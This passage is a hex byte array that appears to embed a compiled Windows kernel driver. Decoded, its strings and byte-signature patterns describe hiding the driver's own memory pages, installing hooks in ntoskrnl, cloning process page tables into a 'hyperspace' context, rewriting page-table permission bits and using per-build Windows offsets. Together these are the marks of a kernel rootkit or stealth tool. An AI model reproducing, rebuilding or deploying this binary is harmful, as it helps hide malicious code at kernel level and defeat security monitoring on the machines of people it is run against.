    0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x50, 0x73, 0x70, 0x45, 0x78, 0x69, 0x74, 0x54,
    0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6C, 0x65,
    0x61, 0x6E, 0x75, 0x70, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x66,
    0x6F, 0x72, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x25, 0x64, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x69,
    0x65, 0x64, 0x20, 0x70, 0x64, 0x65, 0x20, 0x2D, 0x20, 0x57, 0x72, 0x69, 0x74, 0x65, 0x3A, 0x20,
    0x25, 0x64, 0x2C, 0x20, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x44, 0x69, 0x73, 0x61, 0x62,
    0x6C, 0x65, 0x3A, 0x20, 0x25, 0x64, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x69, 0x65, 0x64, 0x20, 0x50, 0x54, 0x45, 0x20,
    0x2D, 0x20, 0x57, 0x72, 0x69, 0x74, 0x65, 0x3A, 0x20, 0x25, 0x64, 0x2C, 0x20, 0x45, 0x78, 0x65,
    0x63, 0x75, 0x74, 0x65, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x3A, 0x20, 0x25, 0x64, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C,
    0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x20, 0x70, 0x68, 0x79, 0x73, 0x20,
    0x6D, 0x65, 0x6D, 0x20, 0x72, 0x65, 0x61, 0x64, 0x2F, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x6C,
    0x69, 0x62, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x65, 0x78,
    0x70, 0x6F, 0x72, 0x74, 0x20, 0x4B, 0x65, 0x46, 0x6C, 0x75, 0x73, 0x68, 0x45, 0x6E, 0x74, 0x69,
    0x72, 0x65, 0x54, 0x62, 0x00, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x79,
    0x20, 0x62, 0x61, 0x73, 0x65, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x20, 0x6F, 0x75, 0x74, 0x73, 0x69, 0x64, 0x65, 0x20, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x72,
    0x61, 0x6E, 0x67, 0x65, 0x20, 0x5B, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2D, 0x30, 0x78, 0x25,
    0x6C, 0x6C, 0x78, 0x5D, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65,
    0x20, 0x50, 0x54, 0x45, 0x5B, 0x25, 0x75, 0x5D, 0x5B, 0x25, 0x75, 0x5D, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x50, 0x44, 0x45, 0x5B, 0x25, 0x75, 0x5D, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61,
    0x74, 0x65, 0x64, 0x20, 0x50, 0x54, 0x20, 0x61, 0x74, 0x20, 0x50, 0x41, 0x20, 0x30, 0x78, 0x25,
    0x6C, 0x6C, 0x78, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x44, 0x5B, 0x25, 0x75, 0x5D, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x50, 0x54,
    0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x44, 0x5B, 0x25, 0x75, 0x5D, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x69, 0x6E, 0x67,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x3A, 0x20, 0x50, 0x4D,
    0x4C, 0x34, 0x5B, 0x25, 0x75, 0x5D, 0x20, 0x2D, 0x3E, 0x20, 0x50, 0x44, 0x50, 0x54, 0x5B, 0x25,
    0x75, 0x5D, 0x20, 0x2D, 0x3E, 0x20, 0x50, 0x44, 0x5B, 0x25, 0x75, 0x5D, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45, 0x20, 0x64, 0x75,
    0x72, 0x69, 0x6E, 0x67, 0x20, 0x73, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x61,
    0x74, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x78, 0x20, 0x25, 0x75, 0x2C, 0x20, 0x73, 0x74, 0x61, 0x74,
    0x75, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x30, 0x38, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F,
    0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45, 0x20, 0x61, 0x74, 0x20, 0x69,
    0x6E, 0x64, 0x65, 0x78, 0x20, 0x25, 0x75, 0x2C, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A,
    0x20, 0x30, 0x78, 0x25, 0x30, 0x38, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65,
    0x61, 0x64, 0x20, 0x6E, 0x65, 0x78, 0x74, 0x20, 0x4C, 0x49, 0x53, 0x54, 0x5F, 0x45, 0x4E, 0x54,
    0x52, 0x59, 0x2C, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x30,
    0x38, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x4C, 0x44,
    0x52, 0x5F, 0x44, 0x41, 0x54, 0x41, 0x5F, 0x54, 0x41, 0x42, 0x4C, 0x45, 0x5F, 0x45, 0x4E, 0x54,
    0x52, 0x59, 0x2C, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x30,
    0x38, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x70,
    0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x2C, 0x20, 0x4E, 0x54, 0x53, 0x54,
    0x41, 0x54, 0x55, 0x53, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x30, 0x38, 0x58, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63,
    0x61, 0x6C, 0x20, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x6F, 0x6E, 0x20, 0x30, 0x78, 0x25,
    0x6C, 0x6C, 0x78, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x77, 0x61, 0x69, 0x74,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x74, 0x61,
    0x74, 0x75, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x52, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x55,
    0x73, 0x65, 0x72, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50,
    0x73, 0x52, 0x65, 0x73, 0x75, 0x6D, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x50, 0x73, 0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x54, 0x68, 0x72, 0x65, 0x61,
    0x64, 0x42, 0x79, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x20, 0x66, 0x61, 0x69, 0x6C,
    0x65, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A, 0x20,
    0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x6F, 0x70, 0x65, 0x6E, 0x20,
    0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x3A, 0x20,
    0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x2C, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E,
    0x69, 0x74, 0x20, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x20, 0x76, 0x61, 0x72, 0x69, 0x61, 0x62,
    0x6C, 0x65, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x65, 0x6E, 0x74,
    0x72, 0x79, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x2C, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x68, 0x69, 0x64, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x70,
    0x61, 0x67, 0x65, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x65, 0x6E,
    0x74, 0x72, 0x79, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x2C, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x20, 0x68, 0x6F, 0x6F, 0x6B,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x3A, 0x3A, 0x73,
    0x77, 0x69, 0x74, 0x63, 0x68, 0x5F, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x63, 0x6F, 0x6E,
    0x74, 0x65, 0x78, 0x74, 0x5F, 0x74, 0x6F, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61,
    0x63, 0x65, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C,
    0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x50,
    0x44, 0x50, 0x54, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61,
    0x74, 0x65, 0x20, 0x63, 0x6C, 0x6F, 0x6E, 0x65, 0x20, 0x50, 0x45, 0x50, 0x52, 0x4F, 0x43, 0x45,
    0x53, 0x53, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x64,
    0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x64, 0x20, 0x6F, 0x72, 0x69, 0x67,
    0x69, 0x6E, 0x61, 0x6C, 0x20, 0x45, 0x50, 0x52, 0x4F, 0x43, 0x45, 0x53, 0x53, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61,
    0x6C, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x6C, 0x69, 0x73, 0x74, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x69,
    0x65, 0x73, 0x20, 0x69, 0x6E, 0x20, 0x63, 0x6C, 0x6F, 0x6E, 0x65, 0x64, 0x20, 0x45, 0x50, 0x52,
    0x4F, 0x43, 0x45, 0x53, 0x53, 0x00, 0x53, 0x55, 0x43, 0x43, 0x45, 0x53, 0x53, 0x00, 0x45, 0x52,
    0x52, 0x4F, 0x52, 0x00, 0x49, 0x4E, 0x46, 0x4F, 0x00, 0x52, 0x41, 0x49, 0x49, 0x00, 0x44, 0x45,
    0x42, 0x55, 0x47, 0x00, 0x57, 0x41, 0x52, 0x4E, 0x49, 0x4E, 0x47, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74,
    0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x50, 0x44, 0x50, 0x54, 0x45, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x50, 0x44, 0x50, 0x54, 0x45, 0x00, 0x43,
    0x4F, 0x44, 0x45, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20,
    0x50, 0x4D, 0x4C, 0x34, 0x45, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64,
    0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C,
    0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x50, 0x44, 0x00, 0x45, 0x54, 0x48, 0x52, 0x45, 0x41, 0x44,
    0x00, 0x32, 0x4D, 0x42, 0x00, 0x34, 0x4B, 0x42, 0x00, 0x31, 0x47, 0x42, 0x00, 0x34, 0x38, 0x20,
    0x38, 0x42, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x37, 0x35,
    0x20, 0x30, 0x37, 0x20, 0x34, 0x38, 0x20, 0x38, 0x42, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F,
    0x20, 0x3F, 0x20, 0x3F, 0x20, 0x45, 0x38, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x00,
    0x34, 0x38, 0x20, 0x38, 0x39, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F,
    0x20, 0x34, 0x38, 0x20, 0x38, 0x44, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20,
    0x3F, 0x20, 0x34, 0x38, 0x20, 0x38, 0x39, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F,
    0x20, 0x3F, 0x20, 0x34, 0x38, 0x20, 0x38, 0x44, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20,
    0x3F, 0x20, 0x3F, 0x20, 0x34, 0x38, 0x20, 0x38, 0x39, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F,
    0x20, 0x3F, 0x20, 0x3F, 0x20, 0x45, 0x38, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20,
    0x45, 0x38, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x45, 0x38, 0x20, 0x3F, 0x20,
    0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x43, 0x36, 0x20, 0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20,
    0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x45, 0x38, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F,
    0x20, 0x34, 0x38, 0x20, 0x36, 0x33, 0x20, 0x44, 0x38, 0x00, 0x34, 0x38, 0x20, 0x38, 0x42, 0x20,
    0x30, 0x35, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x37, 0x34, 0x20, 0x34, 0x39,
    0x20, 0x45, 0x38, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x3F, 0x20, 0x38, 0x42, 0x20, 0x43,
    0x38, 0x00, 0x73, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x5F, 0x72, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x5F,
    0x61, 0x76, 0x61, 0x69, 0x6C, 0x61, 0x62, 0x6C, 0x65, 0x5F, 0x70, 0x6D, 0x6C, 0x34, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64, 0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E,
    0x61, 0x6C, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65,
    0x74, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65,
    0x73, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65,
    0x20, 0x50, 0x4D, 0x4C, 0x34, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F,
    0x63, 0x61, 0x74, 0x65, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20,
    0x50, 0x4D, 0x4C, 0x34, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x6E, 0x6F, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E,
    0x63, 0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x70, 0x64, 0x61,
    0x74, 0x65, 0x20, 0x69, 0x6E, 0x20, 0x63, 0x6C, 0x6F, 0x6E, 0x65, 0x64, 0x20, 0x50, 0x4D, 0x4C,
    0x34, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50, 0x4D,
    0x4C, 0x34, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63,
    0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E,
    0x64, 0x20, 0x69, 0x6E, 0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E, 0x61, 0x6C, 0x20, 0x43, 0x52,
    0x33, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x6F,
    0x6F, 0x6B, 0x20, 0x70, 0x61, 0x74, 0x74, 0x65, 0x72, 0x6E, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66,
    0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C,
    0x20, 0x33, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68,
    0x6F, 0x6F, 0x6B, 0x20, 0x70, 0x61, 0x74, 0x74, 0x65, 0x72, 0x6E, 0x20, 0x6E, 0x6F, 0x74, 0x20,
    0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E,
    0x6C, 0x20, 0x32, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x70, 0x61, 0x74, 0x74, 0x65, 0x72, 0x6E, 0x20, 0x6E, 0x6F, 0x74,
    0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72,
    0x6E, 0x6C, 0x20, 0x31, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x64, 0x65, 0x74, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x73, 0x20, 0x31, 0x31, 0x20, 0x32, 0x32, 0x48, 0x32, 0x2F, 0x32, 0x33, 0x48, 0x32, 0x20, 0x28,
    0x62, 0x75, 0x69, 0x6C, 0x64, 0x20, 0x25, 0x75, 0x29, 0x2C, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67,
    0x20, 0x6F, 0x66, 0x66, 0x73, 0x65, 0x74, 0x20, 0x30, 0x78, 0x34, 0x32, 0x39, 0x30, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x64, 0x65, 0x74, 0x65, 0x63,
    0x74, 0x65, 0x64, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x31, 0x31, 0x20, 0x32,
    0x34, 0x48, 0x32, 0x20, 0x28, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x20, 0x25, 0x75, 0x29, 0x2C, 0x20,
    0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x66, 0x66, 0x73, 0x65, 0x74, 0x20, 0x30, 0x78, 0x34,
    0x38, 0x35, 0x30, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x64, 0x65, 0x74, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73,
    0x20, 0x31, 0x30, 0x20, 0x32, 0x30, 0x48, 0x32, 0x20, 0x2D, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F,
